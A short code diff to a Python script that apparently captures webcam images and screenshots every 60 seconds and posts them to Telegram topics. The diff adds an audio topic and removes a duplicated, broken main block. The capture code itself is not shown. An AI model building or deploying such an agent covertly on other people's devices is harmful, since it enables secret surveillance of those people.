@@ -21,6 +21,7 @@ TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 TOPIC_WEBCAM = os.getenv("TOPIC_WEBCAM")
 TOPIC_SCREENSHOT = os.getenv("TOPIC_SCREENSHOT")
+TOPIC_AUDIO = os.getenv("TOPIC_AUDIO")
 TOPIC_GENERAL = os.getenv("TOPIC_GENERAL")
 
 INTERVAL = 60  # seconds between captures
@@ -154,10 +155,6 @@ def main():
             
     except KeyboardInterrupt:
         print("Agent stopped by user.")
-
-if __name__ == "__main__":
-    main()
-.")
 
 if __name__ == "__main__":
     main()
